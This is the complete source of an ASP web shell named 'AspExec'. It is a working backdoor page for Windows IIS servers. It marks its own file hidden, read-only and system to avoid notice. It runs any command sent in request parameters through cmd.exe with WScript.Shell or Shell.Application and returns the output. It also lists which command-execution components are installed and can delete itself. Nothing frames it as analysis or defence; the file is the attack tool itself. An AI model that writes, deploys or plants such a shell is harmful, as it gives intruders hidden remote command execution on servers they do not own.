<object runat=server id=shell scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<%if err then%>
<object runat=server id=shell scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<% end if %>
<%
'hidded shell
dim file_name
file_name = Server.MapPath("./") & Replace(Request.ServerVariables("Script_Name"),"/","\")
set fso = createobject("scripting.filesystemobject")
set file = fso.getfile(file_name)
file.attributes = 1+2+4
%>
<%
'exec command
Dim path,parms,method,result
path=Trim(Request("path"))
parms=Trim(Request("parms"))
method=Trim(Request("submit"))
result=""
If path="" Then path="C:\WINDOWS\system32\cmd.exe"
If parms="" Then parms="/c "
If method="wscript.shell" Then
	result=shell.exec(path&" "&parms).stdout.readall
Elseif method="shell.application" Then
	set newshell=createobject("shell.application")
	newshell.ShellExecute path,parms,"","open",0
	result="Shell.application Execute OK."
Elseif method="self.delete" Then
	file.attributes = 0
	fso.deletefile(file_name)
	set fso = nothing
End If
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="pragma" content="no-cache">
<title>AspExec</title>
<style>
textarea{resize:none;}
table.gridtable {
	font-family: verdana,arial,sans-serif;
	font-size:11px;
	color:#333333;
	border-width: 1px;
	border-color: #666666;
	border-collapse: collapse;
}
table.gridtable th {
	border-width: 1px;
	padding: 5px 8px;
	border-style: solid;
	border-color: #666666;
	background-color: #dedede;
}
table.gridtable td {
	border-width: 1px;
	padding: 5px 8px;
	border-style: solid;
	border-color: #666666;
	background-color: #ffffff;
}
a:link{text-decoration:none; color:#111;}
a:visited {text-decoration:none; color:#111;}
a:hover {text-decoration:none; color:#111;}
a:active {text-decoration:none; color:#111;} 
</style>
</head>
<body>
<br/>
<form method="post" action="<%=Request.ServerVariables("SCRIPT_NAME")%>" id="submitf">
	<table class="gridtable" width="100%" style="FILTER: progid:DXImageTransform.Microsoft.Shadow(color:#f6ae56,direction:145,strength:15);">
		<tr><td colspan="2" align="center"><h2><a href = "http://le4f.net/" target="_blank">AspExec</a></h2></td></tr>
		<tr>
		<td>
			<table class="gridtable">
			<%
			Dim theComponent(7)
			theComponent(0) = "Scripting.FileSystemObject"
			theComponent(1) = "WScript.Shell"
			theComponent(2) = "WScript.Shell.1"
			theComponent(3) = "WScript.Network"
			theComponent(4) = "WScript.Network.1"
			theComponent(5) = "shell.application"
			theComponent(6) = "shell.application.1"
			Function IsObjInstalled(strClassString)
			On Error Resume Next
			IsObjInstalled = False
			Err = 0
			Dim xTestObj
			Set xTestObj = Server.CreateObject(strClassString)
			If -2147221005 <> Err Then
			IsObjInstalled = True
			Else
			IsObjInstalled = False
			End if
			Set xTestObj = Nothing
			Err = 0
			End Function
			%>
			<tr><th colspan="2" align="center">Component</th></tr>
			<% 
			Dim i
			For i=0 to UBound(theComponent)-1
			If IsObjInstalled(theComponent(i)) Then
			Response.Write "<tr><td width='80'>" & theComponent(i) & "</td><td><font color=""green"">√</font></td></tr>" & vbCrLf
			Else
			Response.Write "<tr><td width='80'>" & theComponent(i) & "</td><td><font color=""red"">×</font></td></tr>" & vbCrLf
			End if
			Next
			%>
			</table>
		</td>
		<td width="100%">
			<DIV align=center
			style='
			color: #990099;
			background-color: #E6E6FA;
			width: 100%;
			height: 180px;
			scrollbar-face-color: #DDA0DD;
			scrollbar-shadow-color: #3D5054;
			scrollbar-highlight-color: #C3D6DA;
			scrollbar-3dlight-color: #3D5054;
			scrollbar-darkshadow-color: #85989C;
			scrollbar-track-color: #D8BFD8;
			scrollbar-arrow-color: #E6E6FA;
			'>
			Path:<input type="text"  value=<% Response.Write path %>   name="path"  style='width:100%;'>
			Parms:<textarea name="parms" style='width:100%;height:70%;'><% Response.Write parms %></textarea>
			</DIV>
			<input type="submit" name= "submit" value="wscript.shell">
			<input type="submit" name= "submit" value="shell.application">
			<input type="submit" name= "submit" value="self.delete">
			<lable>Current Dir : <%response.write request.servervariables("APPL_PHYSICAL_PATH")%></lable>
		</td>
		</tr>
		<tr><th colspan="3" align="center">Result</th></tr>
		<tr><td colspan="3" align="center"><textarea name="result" style='width:100%;height:270px;'><% Response.Write result %></textarea></td></tr>
	</table>
</form>